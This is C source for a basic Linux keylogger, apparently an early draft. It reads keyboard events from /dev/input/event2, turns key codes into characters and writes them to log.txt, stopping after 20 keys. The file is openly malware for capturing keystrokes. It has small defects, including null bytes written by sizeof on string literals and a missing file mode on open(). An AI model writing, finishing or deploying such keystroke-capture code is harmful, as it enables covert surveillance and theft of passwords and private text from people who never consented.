#include <stdlib.h>
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>

#include <linux/input.h>

char *keys = "__1234567890-=__qwertyuiop[]__asdfghjkl;'___zxcvbnm,./";

void keylogger(int log_file) {
    // Set a fd variable for the keyboard file to read from
    // Looks like the keyboard buffer is not constant across machines
    int fd = open("/dev/input/event2", O_RDONLY);

    // While some condition is met - only using this condition temporarily
    int i = 0;
    struct input_event event;
    while (i < 20) {
        // Read from the keyboard
        int bytes_read = read(fd, &event, sizeof(event));
        if (bytes_read == -1) {
            // For debugging purposes
            printf("Could not read\n");
            return;
        }

        // Check to see if EV_KEY event and that a button was pressed
        if (event.type == EV_KEY && event.value == 0) {
            // Need to handle all special cases
            switch(event.code) {
                case 14:
                    write(log_file, "[DELETE]", sizeof("[DELETE]"));
                    break;
                case 15:
                    write(log_file, "\t", sizeof(char));
                    break;
                case 28:
                    write(log_file, "[ENTER]", sizeof("[ENTER]"));
                    break;
                case 43:
                    write(log_file, "\\", sizeof(char));
                    break;
                case 57:
                    write(log_file, " ", sizeof(char));
                    break;
                default:
                    write(log_file, &keys[event.code], sizeof(char));
                    break;
            }
            i++;
        }
    }
}

int main() { 
    int fd = open("log.txt", O_CREAT | O_TRUNC | O_RDWR);
    keylogger(fd);
    return 1;
}